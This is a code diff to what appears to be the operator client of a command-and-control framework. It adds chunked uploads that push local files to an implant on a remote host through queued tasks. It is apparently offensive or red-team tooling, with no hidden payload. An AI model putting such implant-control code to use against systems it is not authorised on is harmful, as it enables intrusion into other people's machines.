@@ -2,7 +2,7 @@ import os
 import socket
 import struct
 
-from generated_commands import CMD_NAMES
+from generated_commands import CMD_NAMES, CMD_IDS
 from protocol import (
     DEFAULT_AGENT_ID,
     MSG_OPERATOR_GET_RESULT,
@@ -34,6 +34,18 @@ PENDING_TASK_ENTRY_SIZE = 16
 TASK_HISTORY_ENTRY_SIZE = 20
 RESULT_HEADER_SIZE = 16
 
+UPLOAD_CHUNK_SIZE = 65536  # 64KB chunks
+
+def encode_upload_chunk(remote_path, offset, chunk_data):
+    """Pack a single upload chunk into the binary format: [PathLen][Path][Offset(8)][DataLen][Data]."""
+    remote_path_bytes = remote_path.encode("utf-16le")
+    return (
+        struct.pack("<I", len(remote_path_bytes)) +
+        remote_path_bytes +
+        struct.pack("<Q", offset) +
+        struct.pack("<I", len(chunk_data)) +
+        chunk_data
+    )
 
 def encode_arg_bytes(cmd_name, arg):
     """
@@ -82,8 +94,7 @@ def encode_arg_bytes(cmd_name, arg):
             raise ValueError(f"Local file not found: {local_path}")
         with open(local_path, "rb") as f:
             data = f.read()
-        remote_path_bytes = remote_path.encode("utf-16le")
-        return struct.pack("<I", len(remote_path_bytes)) + remote_path_bytes + struct.pack("<I", len(data)) + data
+        return encode_upload_chunk(remote_path, 0, data)
 
     # Special case: download <remote_path> <local_path>
     if cmd_name == "download":
@@ -122,6 +133,35 @@ def submit_task(command_id, arg_bytes):
     ) + arg_bytes
     return send_message(MSG_OPERATOR_SUBMIT_TASK, payload)
 
+
+def submit_upload(local_path, remote_path):
+    """
+    Split a large file into multiple CMD_UPLOAD tasks and submit them sequentially.
+    This ensures large files don't exceed network buffers or implant memory limits.
+    """
+    if not os.path.exists(local_path):
+        print(f"[!] Local file not found: {local_path}")
+        return
+
+    file_size = os.path.getsize(local_path)
+    print(f"[*] Uploading {local_path} ({file_size} bytes) in {UPLOAD_CHUNK_SIZE // 1024}KB chunks...")
+
+    with open(local_path, "rb") as f:
+        offset = 0
+        while True:
+            chunk = f.read(UPLOAD_CHUNK_SIZE)
+            if not chunk:
+                break
+            
+            arg_bytes = encode_upload_chunk(remote_path, offset, chunk)
+            response = submit_task(CMD_IDS["upload"], arg_bytes)
+            
+            if not response or response[0] != MSG_SERVER_ACK:
+                print(f"[!] Failed to queue chunk at offset {offset}")
+                break
+            
+            offset += len(chunk)
+    print(f"[*] Successfully queued {offset} bytes for upload.")
 
 def fetch_result(task_id):
     """Query the task server for the result of a previously queued task."""
